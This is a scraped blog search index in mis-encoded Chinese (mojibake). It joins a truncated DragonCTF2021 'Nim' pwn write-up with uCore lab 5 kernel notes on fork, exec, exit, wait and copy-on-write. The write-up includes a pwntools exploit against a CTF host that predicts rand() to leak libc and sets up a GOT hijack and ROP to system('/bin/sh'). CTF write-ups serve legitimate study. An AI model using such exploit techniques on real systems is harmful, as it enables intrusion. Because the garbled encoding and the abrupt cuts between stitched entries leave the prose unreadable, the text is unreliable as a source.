strlenå’Œmempcpy`ã€‚libc@gotå¯å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä»»æ„åœ°å€å†™å››å­—èŠ‚å³å¯åŠ«æŒgotè¡¨ã€‚ ç»§ç»­åˆ†æï¼Œæ­¤æ—¶æ ˆçš„0x2a8é™„è¿‘æœ‰æˆ‘ä»¬çš„åœ¨æ¸¸æˆå¼€å§‹è¾“å…¥çš„nameï¼Œå†å‘ä¸‹å°±æ˜¯å †ä¸­çš„çŸ³å¤´æ•°ç›®ã€‚é€šè¿‡gadgetå›åˆ°nameä¸­ï¼Œè®¾ç½®å †ä¸­çš„çŸ³å¤´æ•°ç›®ä¸ºROPï¼Œä»¥nameä¸ºè·³æ¿ï¼Œæ‰§è¡Œåˆ°ROPã€‚ 0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret; åœ¨leak libcä¹‹åï¼Œæˆ‘ä»¬ä¸å¾—ä¸é¢å¯¹Nimæ¸¸æˆã€‚æ»¡è¶³ä¸‹é¢æ¡ä»¶åˆ™å…ˆæ‰‹å¿…è´¥ï¼š $$a_1\\oplus a_2\\oplus a_3â€¦\\oplus a_n = 0$$ é€šè¿‡æ¨¡æ‹Ÿéšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œå¯ä»¥é¢„æµ‹å‡ºDealerçš„æ‰€æœ‰å †å—ã€‚ä¹‹ååªè¦è®¾ç½®æˆ‘ä»¬çš„å †å—ï¼Œä½¿æ‰€æœ‰å †å—çŸ³å­æ•°ç›®å¼‚æˆ–å’Œä¸º0ï¼Œåˆ™Dealeré¢å¯¹çš„å°±æ˜¯å¿…è´¥çŠ¶æ€ã€‚å®ƒä¸å¾—ä¸å–å‡ºçŸ³å­ï¼Œè¿™æ ·å¼‚æˆ–å’Œæ”¹å˜ï¼Œæˆ‘ä»¬åªè¦å–å‡ºå¼‚æˆ–å’Œæ•°é‡çš„çŸ³å­æ•°ï¼Œå°±èƒ½ä¸€ç›´å°†å¿…è´¥çŠ¶æ€ç•™ç»™Dealerã€‚ä»è€Œä½¿åˆ†æ•°åˆ°è¾¾æˆ‘ä»¬çš„ç›®æ ‡å€¼ã€‚ from pwn import * leak = lambda name,addr: log.success('{0}---\u003e {1}'.format(name, hex(addr))) binary = './nim' libc = './libc.so' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='info') # p = process(binary) p = remote('nim.hackable.software',1337) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) const_num1 = 0x7CC216571FEE6FB const_num2 = 0xFFFFFFFFFFFFFA3 class RandSim: seed = 0 def __init__(self): self.seed = 0 def set_seed(self, seed): self.seed = seed def get_next(self): val = self.seed \u0026 0x7fffffff self.seed = self.rand_sim(self.seed) return val def rand_sim(self,s): val = 0 min = 0x7CC216571FEE6FB while s != 0: if(s \u00261) !=0: val = (min+val) % 0xFFFFFFFFFFFFFA3 s = s \u003e\u003e 1 min = 2 * min % 0xFFFFFFFFFFFFFA3 return val Randgen = RandSim() def get_dealer(): p.recvuntil(\"Dealer has taken \") num = int(p.recvuntil(\" stone(s)\",drop=True),10) p.recvuntil(\"from heap \") idx = int(p.recvuntil(\".\\n\",drop=True),10) return num, idx def nim(heaps): sum = 0 for i in heaps: sum = sum^i if sum: for i in range(len(heaps)): val = sum^heaps[i] if val \u003c heaps[i]: return i, heaps[i]-val else: for i in range(len(heaps)): if heaps[i] !=0 : return i, heaps[i] def win(bet): heaps = [] for i in range(4): heaps.append(Randgen.get_next()) heaps.append(heaps[0]) heaps.append(heaps[1]) heaps.append(heaps[2]) heaps.append(heaps[3]) p.sendlineafter(\"game? \", str(bet)) p.sendlineafter(\"s?\", '8') for i in range(4): p.sendlineafter(\": \",str(heaps[i])) while 1: last = 0 p.recvuntil(\"The current set of heaps is: [\") heap_list = map(int, p.recvuntil(\"]\",drop=True).split(\", \")) idx, val = nim(heap_list) p.sendlineafter(\"resign): \",str(idx+1)) p.sendlineafter(\"heap: \",str(val)) if heap_list.count(0) == len(heap_list)-1: last = 1 if last: p.recvuntil(\"Current score: \") cur = int(p.recvuntil(\". C\",drop=True),10) return cur def win_game(cur,target): while 1: off = target - cur if(off\u003e=cur): cur = win(cur) else: cur = win(off) leak(\"current scores \", cur) if(cur == target): break p.sendlineafter(\"[y/n]? \",'y') def main(): global p p.sendlineafter(\"Choice: \", 'P') p.sendlineafter(\"name? \",\"Niebelungen\") # libc p.sendlineafter(\"game? \", '1') p.sendlineafter(\"?\", '8') for i in range(4): p.sendlineafter(\": \",'1') num, idx = get_dealer() p.recvuntil(\"The current set of heaps is: [\") heap_list = map(int, p.recvuntil(\"]\",drop=True).split(\", \")) heap_list[idx-1] += num rand_addr = 0 for i in range(2**10): guess = (0x7e \u003c\u003c 40) | (i \u003c\u003c 31) | heap_list[0] num = Randgen.rand_sim(guess) if (num \u0026 0x7FFFFFFF) == heap_list[1]: rand_addr = guess break libc_base = rand_addr - libc.sym[\"rand\"] Randgen.set_seed(rand_addr) for i in range(4): Randgen.get_next() leak(\"libc base\", libc_base) p.sendlineafter(\"resign): \",'0') p.sendlineafter(\"[y/n]? \",'n') # strchrnul@libc.got 0x1eb040 # strlen@libc.got 0x1eb0a8 # memcpy@libc.got 0x1eb148 # name - stack 0x2a8 # + 0x20 0x2c8 # + 0x20 0x2e8 system = libc_base + libc.sym['system'] binsh = libc_base + l","date":"2021-12-19","objectID":"/dragonctf2021-nim/:0:0","series":null,"tags":["Writeups"],"title":"DragonCTF2021-Nim","uri":"/dragonctf2021-nim/#nim"},{"categories":["Pwning"],"content":"ç»ƒä¹ 0åœ¨idt_initä¸­æ·»åŠ  SETGATE(idt[T_SYSCALL], 0, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER); ä¿®æ”¹å®šæ—¶å™¨ä¸­æ–­ï¼š ticks ++; if (ticks % TICK_NUM == 0) { assert(current != NULL); current-\u003eneed_resched = 1; // print_ticks(); } åœ¨alloc_procä¸­å¤šå‡ºäº†PCBä¸­çš„ä¸€äº›å­—æ®µéœ€è¦è®¾ç½® proc-\u003estate = PROC_UNINIT; proc-\u003epid = -1; proc-\u003ekstack = 0; proc-\u003eneed_resched = 0; proc-\u003eparent = NULL; proc-\u003emm = NULL; memset(\u0026proc-\u003econtext, 0, sizeof(struct context)); proc-\u003etf = NULL; proc-\u003ecr3 = boot_cr3; proc-\u003eflags = 0; memset(proc-\u003ename, 0, sizeof(proc-\u003ename)); proc-\u003ewait_state = 0; proc-\u003ecptr = proc-\u003eyptr = proc-\u003eoptr = NULL; do_forkä¸­çš„é“¾è¡¨æ“ä½œç”±set_linkså®ç° proc-\u003epid = get_pid(); hash_proc(proc); // list_add(proc_list.prev, \u0026proc-\u003elist_link); set_links(proc); // nr_process++; è¿™é‡Œæˆ‘é€‰æ‹©å°†è¿›ç¨‹åŠ å…¥åˆ°proc_listçš„é“¾è¡¨å°¾éƒ¨ã€‚å› ä¸ºæˆ‘è§‰å¾—è¿™æ ·çš„å®ç°å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šï¼Œè®©é“¾è¡¨ä¸­çš„è¿›ç¨‹æŒ‰ç…§ä»æ—§åˆ°æ–°çš„é¡ºåºæ’åˆ—ã€‚ç­‰å¾…è¶Šä¹…çš„è¿›ç¨‹ä¼˜å…ˆçº§ä¼šè¶Šé«˜ï¼Œè€Œä»é“¾è¡¨å¤´å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„è·å¾—ã€‚å®éªŒä¸­å¹¶æ²¡æœ‰å¯¹è¿™éƒ¨åˆ†çš„è¦æ±‚ï¼Œä½†æˆ‘åŒæ ·é€šè¿‡äº†æµ‹è¯•ã€‚ ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ç»ƒä¹ 0"},{"categories":["Pwning"],"content":"ç»ƒä¹ 1åŠ è½½åº”ç”¨ç¨‹åºå¹¶æ‰§è¡Œ åœ¨load_icodeè®¾ç½®æ­£ç¡®çš„tfå­—æ®µã€‚ tf-\u003etf_cs = USER_CS; tf-\u003etf_ds = tf-\u003etf_es = tf-\u003etf_ss = USER_DS; tf-\u003etf_esp = USTACKTOP; tf-\u003etf_eip = elf-\u003ee_entry; tf-\u003etf_eflags |= FL_IF; ret = 0; ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ç»ƒä¹ 1"},{"categories":["Pwning"],"content":"ç»ƒä¹ 2çˆ¶è¿›ç¨‹å¤åˆ¶è‡ªå·±çš„å†…å­˜ç©ºé—´ç»™å­è¿›ç¨‹ è¡¥å……copy_rangeçš„å®ç° uintptr_t src_kvaddr = page2kva(page); uintptr_t dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); page_insert(to, npage, start, perm); assert(ret == 0); ","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ç»ƒä¹ 2"},{"categories":["Pwning"],"content":"ç»ƒä¹ 3","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ç»ƒä¹ 3"},{"categories":["Pwning"],"content":"forkforkçš„æµç¨‹æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œä¸è¿‡PCBä¸­å¤šçš„æ•°æ®ç»“æ„å’Œä¸€äº›é“¾è¡¨éƒ½é€šè¿‡set_linkså®ç°äº† /** parent: proc-\u003eparent (proc is children) children: proc-\u003ecptr (proc is parent) older sibling: proc-\u003eoptr (proc is younger sibling) younger sibling: proc-\u003eyptr (proc is older sibling) **/ // set_links - set the relation links of process static void set_links(struct proc_struct *proc) { list_add(proc_list.prev, \u0026(proc-\u003elist_link)); proc-\u003eyptr = NULL; if ((proc-\u003eoptr = proc-\u003eparent-\u003ecptr) != NULL) { proc-\u003eoptr-\u003eyptr = proc; } proc-\u003eparent-\u003ecptr = proc; nr_process ++; } æ ¹æ®æ³¨é‡Š parentï¼šå¦‚æœprocæ˜¯æŸä¸ªè¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘å…¶çˆ¶è¿›ç¨‹ cptrï¼šå¦‚æœprocæ˜¯æŸä¸ªå­è¿›ç¨‹çš„çˆ¶äº²ï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘å…¶å­è¿›ç¨‹ optrï¼šå¦‚æœè¯¥è¿›ç¨‹è¯´æŸä¸ªè¿›ç¨‹çš„å¤šä¸ªå­è¿›ç¨‹çš„ä¸€ä¸ªï¼Œä¸”æ˜¯è¢«è¾ƒæ™šåˆ›å»ºçš„é‚£ä¸€ä¸ªï¼Œé‚£ä¹ˆè¯¥æŒ‡é’ˆæŒ‡å‘æ¯”å®ƒæ›´æ—©åˆ›å»ºçš„å…„å¼Ÿ yptrï¼šå¦‚æœè¯¥è¿›ç¨‹è¯´æŸä¸ªè¿›ç¨‹çš„å¤šä¸ªå­è¿›ç¨‹çš„ä¸€ä¸ªï¼Œä¸”æ˜¯è¢«è¾ƒæ—©åˆ›å»ºçš„é‚£ä¸€ä¸ªï¼Œé‚£ä¹ˆè¯¥æŒ‡é’ˆæŒ‡å‘æ¯”å®ƒæ›´æ™šåˆ›å»ºçš„å…„å¼Ÿ ","date":"2021-12-14","objectID":"/ucore-lab-5/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#fork"},{"categories":["Pwning"],"content":"exec // do_execve - call exit_mmap(mm)\u0026put_pgdir(mm) to reclaim memory space of current process // - call load_icode to setup new memory space accroding binary prog. int do_execve(const char *name, size_t len, unsigned char *binary, size_t size) { struct mm_struct *mm = current-\u003emm; if (!user_mem_check(mm, (uintptr_t)name, len, 0)) { return -E_INVAL; } if (len \u003e PROC_NAME_LEN) { len = PROC_NAME_LEN; } char local_name[PROC_NAME_LEN + 1]; memset(local_name, 0, sizeof(local_name)); memcpy(local_name, name, len); if (mm != NULL) { lcr3(boot_cr3); if (mm_count_dec(mm) == 0) { exit_mmap(mm); put_pgdir(mm); mm_destroy(mm); } current-\u003emm = NULL; } int ret; if ((ret = load_icode(binary, size)) != 0) { goto execve_exit; } set_proc_name(current, local_name); return 0; execve_exit: do_exit(ret); panic(\"already exit: %e.\\n\", ret); } é¦–å…ˆï¼Œé€šè¿‡å½“å‰è¿›ç¨‹çš„mmå­—æ®µï¼Œæ£€æŸ¥å¯¹åº”å†…å­˜çš„æƒé™ç­‰æƒ…å†µæ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚æ¥ç€ï¼ŒåŠ è½½å†…æ ¸çš„cr3å¯„å­˜å™¨ï¼Œå›æ”¶ç›¸åº”çš„å†…å­˜èµ„æºã€‚å†…å­˜ä½¿ç”¨å¼•ç”¨è®¡æ•°æ³•è¿›ç¨‹åƒåœ¾å›æ”¶ã€‚ç„¶åï¼Œæ‰§è¡Œload_icodeã€‚ /* load_icode - load the content of binary program(ELF format) as the new content of current process * @binary: the memory addr of the content of binary program * @size: the size of the content of binary program */ static int load_icode(unsigned char *binary, size_t size) { if (current-\u003emm != NULL) { panic(\"load_icode: current-\u003emm must be empty.\\n\"); } int ret = -E_NO_MEM; struct mm_struct *mm; //(1) create a new mm for current process if ((mm = mm_create()) == NULL) { goto bad_mm; } //(2) create a new PDT, and mm-\u003epgdir= kernel virtual addr of PDT if (setup_pgdir(mm) != 0) { goto bad_pgdir_cleanup_mm; } //(3) copy TEXT/DATA section, build BSS parts in binary to memory space of process struct Page *page; //(3.1) get the file header of the bianry program (ELF format) struct elfhdr *elf = (struct elfhdr *)binary; //(3.2) get the entry of the program section headers of the bianry program (ELF format) struct proghdr *ph = (struct proghdr *)(binary + elf-\u003ee_phoff); //(3.3) This program is valid? if (elf-\u003ee_magic != ELF_MAGIC) { ret = -E_INVAL_ELF; goto bad_elf_cleanup_pgdir; } uint32_t vm_flags, perm; struct proghdr *ph_end = ph + elf-\u003ee_phnum; for (; ph \u003c ph_end; ph ++) { //(3.4) find every program section headers if (ph-\u003ep_type != ELF_PT_LOAD) { continue ; } if (ph-\u003ep_filesz \u003e ph-\u003ep_memsz) { ret = -E_INVAL_ELF; goto bad_cleanup_mmap; } if (ph-\u003ep_filesz == 0) { continue ; } //(3.5) call mm_map fun to setup the new vma ( ph-\u003ep_va, ph-\u003ep_memsz) vm_flags = 0, perm = PTE_U; if (ph-\u003ep_flags \u0026 ELF_PF_X) vm_flags |= VM_EXEC; if (ph-\u003ep_flags \u0026 ELF_PF_W) vm_flags |= VM_WRITE; if (ph-\u003ep_flags \u0026 ELF_PF_R) vm_flags |= VM_READ; if (vm_flags \u0026 VM_WRITE) perm |= PTE_W; if ((ret = mm_map(mm, ph-\u003ep_va, ph-\u003ep_memsz, vm_flags, NULL)) != 0) { goto bad_cleanup_mmap; } unsigned char *from = binary + ph-\u003ep_offset; size_t off, size; uintptr_t start = ph-\u003ep_va, end, la = ROUNDDOWN(start, PGSIZE); ret = -E_NO_MEM; //(3.6) alloc memory, and copy the contents of every program section (from, from+end) to process's memory (la, la+end) end = ph-\u003ep_va + ph-\u003ep_filesz; //(3.6.1) copy TEXT/DATA section of bianry program while (start \u003c end) { if ((page = pgdir_alloc_page(mm-\u003epgdir, la, perm)) == NULL) { goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end \u003c la) { size -= la - end; } memcpy(page2kva(page) + off, from, size); start += size, from += size; } //(3.6.2) build BSS section of binary program end = ph-\u003ep_va + ph-\u003ep_memsz; if (start \u003c la) { /* ph-\u003ep_memsz == ph-\u003ep_filesz */ if (start == end) { continue ; } off = start + PGSIZE - la, size = PGSIZE - off; if (end \u003c la) { size -= la - end; } memset(page2kva(page) + off, 0, size); start += size; assert((end \u003c la \u0026\u0026 start == end) || (end \u003e= la \u0026\u0026 start == la)); } while (start \u003c end) { if ((page = pgdir_alloc_page(mm-\u003epgdir, la, perm)) == NULL) { goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end \u003c la) { size -= la - end; } memset(page2kva(page) + off, 0, size); start += size; } } //(4) build user stack memory vm_flags = VM_READ | VM_WRITE | V","date":"2021-12-14","objectID":"/ucore-lab-5/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#exec"},{"categories":["Pwning"],"content":"exit // do_exit - called by sys_exit // 1. call exit_mmap \u0026 put_pgdir \u0026 mm_destroy to free the almost all memory space of process // 2. set process' state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself. // 3. call scheduler to switch to other process int do_exit(int error_code) { if (current == idleproc) { panic(\"idleproc exit.\\n\"); } if (current == initproc) { panic(\"initproc exit.\\n\"); } struct mm_struct *mm = current-\u003emm; if (mm != NULL) { lcr3(boot_cr3); if (mm_count_dec(mm) == 0) { exit_mmap(mm); put_pgdir(mm); mm_destroy(mm); } current-\u003emm = NULL; } current-\u003estate = PROC_ZOMBIE; current-\u003eexit_code = error_code; bool intr_flag; struct proc_struct *proc; local_intr_save(intr_flag); { proc = current-\u003eparent; if (proc-\u003ewait_state == WT_CHILD) { wakeup_proc(proc); } while (current-\u003ecptr != NULL) { proc = current-\u003ecptr; current-\u003ecptr = proc-\u003eoptr; proc-\u003eyptr = NULL; if ((proc-\u003eoptr = initproc-\u003ecptr) != NULL) { initproc-\u003ecptr-\u003eyptr = proc; } proc-\u003eparent = initproc; initproc-\u003ecptr = proc; if (proc-\u003estate == PROC_ZOMBIE) { if (initproc-\u003ewait_state == WT_CHILD) { wakeup_proc(initproc); } } } } local_intr_restore(intr_flag); schedule(); panic(\"do_exit will not return!! %d.\\n\", current-\u003epid); } å‡å°‘è¿›ç¨‹mmçš„æŒ‡å‘å†…å­˜çš„å¼•ç”¨è®¡æ•°ï¼Œå¦‚æœå¿…è¦éœ€è¦é‡Šæ”¾å…¶æŒ‡å‘å†…å­˜å’Œmmç»“æ„ï¼Œå¹¶æ¸…ç©ºé¡µè¡¨é¡¹ã€‚è®¾ç½®å½“å‰è¿›ç¨‹çš„çŠ¶æ€ä¸ºPROC_ZOMBIEã€‚ æ¥ç€ï¼Œè¿˜åˆ¤æ–­å½“å‰å…¶çˆ¶è¿›ç¨‹æ˜¯å¦åœ¨ç­‰å¾…å­è¿›ç¨‹é€€å‡ºï¼Œå¦‚æœæ˜¯åˆ™è¦å”¤é†’çˆ¶è¿›ç¨‹ã€‚å¦‚æœè¯¥è¿›ç¨‹è¿˜æœ‰å­è¿›ç¨‹ï¼Œåˆ™ä¼šè¢«initprocé¢†å…»ã€‚å¹¶ä¸”å…¶å“¥å“¥è¿›ç¨‹å˜æˆäº†å½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œç”±æ­¤åœ¨å¾ªç¯ä¸­initprocå¯ä»¥å°†è¯¥è¿›ç¨‹çš„æ‰€æœ‰å­è¿›ç¨‹å›æ”¶ã€‚ è¿›ç¨‹å›æ”¶å®Œæ¯•ä¹‹åï¼Œè°ƒç”¨schedule()è®©cpuè¿è¡Œä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚ ","date":"2021-12-14","objectID":"/ucore-lab-5/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#exit"},{"categories":["Pwning"],"content":"wait // do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack // - proc struct of this child. // NOTE: only after do_wait function, all resources of the child proces are free. int do_wait(int pid, int *code_store) { struct mm_struct *mm = current-\u003emm; if (code_store != NULL) { if (!user_mem_check(mm, (uintptr_t)code_store, sizeof(int), 1)) { return -E_INVAL; } } struct proc_struct *proc; bool intr_flag, haskid; repeat: haskid = 0; if (pid != 0) { proc = find_proc(pid); if (proc != NULL \u0026\u0026 proc-\u003eparent == current) { haskid = 1; if (proc-\u003estate == PROC_ZOMBIE) { goto found; } } } else { proc = current-\u003ecptr; for (; proc != NULL; proc = proc-\u003eoptr) { haskid = 1; if (proc-\u003estate == PROC_ZOMBIE) { goto found; } } } if (haskid) { current-\u003estate = PROC_SLEEPING; current-\u003ewait_state = WT_CHILD; schedule(); if (current-\u003eflags \u0026 PF_EXITING) { do_exit(-E_KILLED); } goto repeat; } return -E_BAD_PROC; found: if (proc == idleproc || proc == initproc) { panic(\"wait idleproc or initproc.\\n\"); } if (code_store != NULL) { *code_store = proc-\u003eexit_code; } local_intr_save(intr_flag); { unhash_proc(proc); remove_links(proc); } local_intr_restore(intr_flag); put_kstack(proc); kfree(proc); return 0; } waitå‡½æ•°ä¼šç­‰å¾…æŸä¸€å­è¿›ç¨‹ï¼ˆæŒ‡å®šPIDè¿›ç¨‹ï¼Œæˆ–è€…ä»»ä¸€å­è¿›ç¨‹ï¼‰é€€å‡ºï¼ˆå³çŠ¶æ€å˜ä¸ºPROC_ZOMBIEï¼‰ï¼Œç„¶åå°†å¯¹åº”çš„å­è¿›ç¨‹ä»å“ˆå¸Œè¡¨ä¸­è§£é“¾ï¼Œæ¸…ç©ºå†…æ ¸æ ˆå’ŒPCBã€‚å¦‚æœæ²¡æœ‰å­è¿›ç¨‹å¤„äºPROC_ZOMBIEçŠ¶æ€ï¼Œåˆ™å½“å‰è¿›ç¨‹ä¼šå˜ä¸ºPROC_SLEEPINGå¹¶æ‰§è¡Œscheduleè°ƒåº¦å…¶ä»–è¿›ç¨‹è¿è¡Œï¼Œç›´åˆ°å­è¿›ç¨‹é€€å‡ºåï¼Œæ‰è¢«å”¤é†’ã€‚ ","date":"2021-12-14","objectID":"/ucore-lab-5/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#wait"},{"categories":["Pwning"],"content":"Challenge: COW","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#challenge-cow"},{"categories":["Pwning"],"content":"ucoreçš„COWæœºåˆ¶çš„å®ç°æ€æƒ³çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´å…±äº«ï¼ˆshareï¼‰é¡µé¢è€Œä¸æ˜¯å¤åˆ¶ï¼ˆcopyï¼‰é¡µé¢ã€‚ä½†åªè¦é¡µé¢è¢«å…±äº«ï¼Œå®ƒä»¬å°±ä¸èƒ½è¢«ä¿®æ”¹ï¼Œå³æ˜¯åªè¯»çš„ã€‚æ³¨æ„æ­¤å…±äº«æ˜¯æŒ‡çˆ¶å­è¿›ç¨‹å…±äº«ä¸€ä¸ªè¡¨ç¤ºå†…å­˜ç©ºé—´çš„mm_structç»“æ„çš„å˜é‡ã€‚å½“çˆ¶è¿›ç¨‹æˆ–å­è¿›ç¨‹è¯•å›¾å†™ä¸€ä¸ªå…±äº«çš„é¡µé¢ï¼Œå°±äº§ç”Ÿä¸€ä¸ªé¡µè®¿é—®å¼‚å¸¸ï¼Œè¿™æ—¶å†…æ ¸å°±æŠŠè¿™ä¸ªé¡µå¤åˆ¶åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢ä¸­å¹¶æ ‡è®°ä¸ºå¯å†™ã€‚æ³¨æ„ï¼ŒåŸæ¥çš„é¡µé¢ä»ç„¶æ˜¯å†™ä¿æŠ¤çš„ã€‚å½“å…¶å®ƒè¿›ç¨‹è¯•å›¾å†™å…¥æ—¶ï¼Œucoreæ£€æŸ¥å†™è¿›ç¨‹æ˜¯å¦æ˜¯è¿™ä¸ªé¡µé¢çš„å”¯ä¸€å±ä¸»ï¼ˆé€šè¿‡åˆ¤æ–­page_ref å’Œ swap_page_count å³ mem_map ä¸­ç›¸å…³ entry ä¿å­˜çš„å€¼çš„å’Œæ˜¯å¦ä¸º1ã€‚ï¼‰å¦‚æœæ˜¯ï¼Œå®ƒæŠŠè¿™ä¸ªé¡µé¢æ ‡è®°ä¸ºå¯¹è¿™ä¸ªè¿›ç¨‹æ˜¯å¯å†™çš„ã€‚ åœ¨å…·ä½“å®ç°ä¸Šï¼Œucoreè°ƒç”¨dup_mmapå‡½æ•°ï¼Œå¹¶è¿›ä¸€æ­¥è°ƒç”¨copy_rangeå‡½æ•°æ¥å…·ä½“å®Œæˆå¯¹é¡µè¡¨å†…å®¹çš„å¤åˆ¶ï¼Œè¿™æ ·ä¸¤ä¸ªé¡µè¡¨è¡¨ç¤ºåŒä¸€ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆåŒ…æ‹¬å¯¹åº”çš„ç‰©ç†åœ°å€ç©ºé—´ï¼‰ï¼Œä¸”è¿˜éœ€ä¿®æ”¹ä¸¤ä¸ªé¡µè¡¨ä¸­æ¯ä¸€ä¸ªé¡µå¯¹åº”çš„é¡µè¡¨é¡¹å±æ€§ä¸ºåªè¯»ï¼Œä½†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªè¿›ç¨‹æœ‰ä¸¤ä¸ªé¡µè¡¨ï¼Œä½†è¿™ä¸¤ä¸ªé¡µè¡¨åªæ˜ å°„äº†ä¸€å—åªè¯»çš„ç‰©ç†å†…å­˜ã€‚åŒç†ï¼Œå¯¹äºæ¢å‡ºçš„é¡µï¼Œä¹Ÿé‡‡ç”¨åŒæ ·çš„åŠæ³•æ¥å…±äº«ä¸€ä¸ªæ¢å‡ºé¡µã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºï¼šå¦‚æœä¸€ä¸ªé¡µçš„PTEå±æ€§æ˜¯åªè¯»çš„ï¼Œä½†æ­¤é¡µæ‰€å±çš„VMAæè¿°æŒ‡å‡ºå…¶è™šåœ°å€ç©ºé—´æ˜¯å¯å†™çš„ï¼Œåˆ™è¿™æ ·çš„é¡µæ˜¯COWé¡µã€‚ å½“å¯¹è¿™æ ·çš„åœ°å€ç©ºé—´è¿›è¡Œå†™æ“ä½œçš„æ—¶å€™ï¼Œä¼šè§¦å‘do_pgfaultå‡½æ•°è¢«è°ƒç”¨ã€‚æ­¤å‡½æ•°å¦‚æœå‘ç°æ˜¯COWé¡µï¼Œå°±ä¼šè°ƒç”¨alloc_pageå‡½æ•°æ–°åˆ†é…ä¸€ä¸ªç‰©ç†é¡µï¼Œå¹¶è°ƒç”¨memcpyå‡½æ•°æŠŠæ—§é¡µçš„å†…å®¹å¤åˆ¶åˆ°æ–°é¡µä¸­ï¼Œå¹¶æœ€åè°ƒç”¨page_insertå‡½æ•°ç»™å½“å‰äº§ç”Ÿç¼ºé¡µé”™çš„è¿›ç¨‹å»ºç«‹è™šæ‹Ÿé¡µåœ°å€åˆ°æ–°ç‰©ç†é¡µåœ°å€çš„æ˜ å°„å…³ç³»ï¼ˆå³æ”¹å†™PTEï¼Œå¹¶è®¾ç½®æ­¤é¡µä¸ºå¯è¯»å†™ï¼‰ã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼Œå¦‚æœäº§ç”Ÿè®¿é—®å¼‚å¸¸çš„é¡µå·²ç»è¢«æ¢å‡ºåˆ°ç¡¬ç›˜ä¸Šäº†ï¼Œåˆ™éœ€è¦æŠŠæ­¤é¡µé€šè¿‡swap_in_pageå‡½æ•°æ¢å…¥åˆ°å†…å­˜ä¸­æ¥ï¼Œå¦‚æœè¿›ä¸€æ­¥å‘ç°æ¢å…¥çš„é¡µæ˜¯ä¸€ä¸ªCOWé¡µï¼Œåˆ™æŠŠå…¶å±æ€§è®¾ç½®ä¸ºåªè¯»ï¼Œç„¶åå¼‚å¸¸å¤„ç†ç»“æŸè¿”å›ã€‚ä½†è¿™æ ·é‡æ–°æ‰§è¡Œäº§ç”Ÿå¼‚å¸¸çš„å†™æ“ä½œï¼Œåˆä¼šè§¦å‘ä¸€æ¬¡å†…å­˜è®¿é—®å¼‚å¸¸ï¼Œåˆ™åˆè¦æ‰§è¡Œä¸Šä¸€æ®µæè¿°çš„è¿‡ç¨‹äº†ã€‚ Pageç»“æ„çš„refåŸŸç”¨äºè·Ÿè¸ªå…±äº«ç›¸åº”é¡µé¢çš„è¿›ç¨‹æ•°ç›®ã€‚åªè¦è¿›ç¨‹é‡Šæ”¾ä¸€ä¸ªé¡µé¢æˆ–è€…åœ¨å®ƒä¸Šé¢æ‰§è¡Œå†™æ—¶å¤åˆ¶ï¼Œå®ƒçš„refåŸŸå°±é€’å‡ï¼›åªæœ‰å½“refå˜ä¸º0æ—¶ï¼Œè¿™ä¸ªé¡µé¢æ‰è¢«é‡Šæ”¾ã€‚ ","date":"2021-12-14","objectID":"/ucore-lab-5/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ucoreçš„cowæœºåˆ¶çš„å®ç°æ€æƒ³"},{"categories":["Pwning"],"content":"DO ITåœ¨copy_rangeä¸­é€šè¿‡åˆ¤æ–­shareå‚æ•°æ˜¯å¦è¢«æŒ‡å®šï¼Œé€‰æ‹©æ˜¯shareè¿˜æ˜¯å®Œå…¨å¤åˆ¶ã€‚ int copy_range(pde_t *to, pde_t *from, uintptr_t start, uintptr_t end, bool share) { assert(start % PGSIZE == 0 \u0026\u0026 end % PGSIZE == 0); assert(USER_ACCESS(start, end)); // copy content by page unit. do { //call get_pte to find process A's pte according to the addr start pte_t *ptep = get_pte(from, start, 0), *nptep; if (ptep == NULL) { start = ROUNDDOWN(start + PTSIZE, PTSIZE); continue ; } //call get_pte to find process B's pte according to the addr start. If pte is NULL, just alloc a PT if 